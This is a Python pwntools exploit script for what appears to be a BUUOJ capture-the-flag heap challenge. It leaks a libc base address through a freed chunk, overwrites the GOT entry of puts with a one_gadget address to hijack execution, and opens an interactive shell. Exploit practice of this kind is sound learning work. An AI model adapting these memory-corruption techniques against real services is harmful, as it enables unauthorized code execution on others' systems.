from pwn import  *
from LibcSearcher import LibcSearcher
from argparse import ArgumentParser, ArgumentDefaultsHelpFormatter

s = lambda data: p.send(str(data))
sa = lambda delim,data: p.sendafter(delim,str(data))
sl = lambda data: p.sendline(str(data))
sla = lambda delim,data: p.sendlineafter(delim,str(data))
r = lambda num=4096: p.recv(num)
ru = lambda delims,drop=True: p.recvuntil(delims,drop)
uu64 = lambda data: u64(data.ljust(8,'\0'))
leak = lambda name,addr: log.success('{} = {:#x}'.format(name, addr))

def leak_libc(func,addr,elf=None):
	if elf:
		libc = elf
		base = addr-libc.sym[func]
		leak('base',base)
		system = base+libc.sym['system']
	else:
		libc = LibcSearcher(func,addr)
		base = addr-libc.dump(func)
		leak('base',base)
		system = base+libc.dump('system')

	return (base,libc,system)

parser = ArgumentParser(formatter_class=ArgumentDefaultsHelpFormatter)
parser.add_argument('-b',help='binary file',required=True,metavar='BINARY')
parser.add_argument('-r',help='remote host',default='node3.buuoj.cn',metavar='RHOST')
parser.add_argument('-p',type=int,help='remote port',metavar='RPORT')
parser.add_argument('-l',help='libc - [xx] for v2.xx, or [/path/to/libc.so.6] to load a specific libc',default='23',metavar='LIBC')
parser.add_argument('-d',help='disable DEBUG mode',action='store_true')
args = parser.parse_args()
print(args)

binary = args.b
context.binary = binary
elf = ELF(binary,checksec=False)
if not args.d:
	context.log_level = 'DEBUG'

path_dict = {
	'23': '/lib/x86_64-linux-gnu/libc.so.6',
	'27': './glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc-2.27.so',
	'29': './glibc-all-in-one/libs/2.29-0ubuntu2_amd64/libc-2.29.so'
}
libc_path = path_dict.get(args.l, args.l)
libc = ELF(libc_path,checksec=False)
if args.p:
	p = remote(args.r, args.p)
else:
	p = process(binary,env={'LD_PRELOAD':libc_path})

def dbg():
	gdb.attach(p)
	pause()

def reg(size,name):
	sla('choice:',2)
	sla(':',size)
	sla(':',name)
	sla(':',20)
	sla(':','desc')

def login(name):
	sla('choice:',1)
	sla(':',name)

def logout():
	sla('choice:',6)

def add_free(name,choice):
	sla('choice:',3)
	sla(':',name)
	sla('(a/d)', choice)

def view_profile():
	sla('choice:',1)

def edit(name):
	sla('choice:',2)
	sa(':', name)
	sla(':',20)
	sla(':','desc')

# start
reg(8,'a'*6)
reg(8,'b'*6)
login('b'*6)
add_free('b'*6,'a')
add_free('b'*6,'d')

view_profile()
ru('Age:')
base = int(ru('\n'),16)-88-libc.sym['__malloc_hook']-0x10
leak('base',base)
puts = base + libc.sym['puts']

logout()
reg(0x20, p64(elf.got['puts']))
login(p64(puts))
edit(p64(base+0x4526a)[:-2])
# end

p.interactive()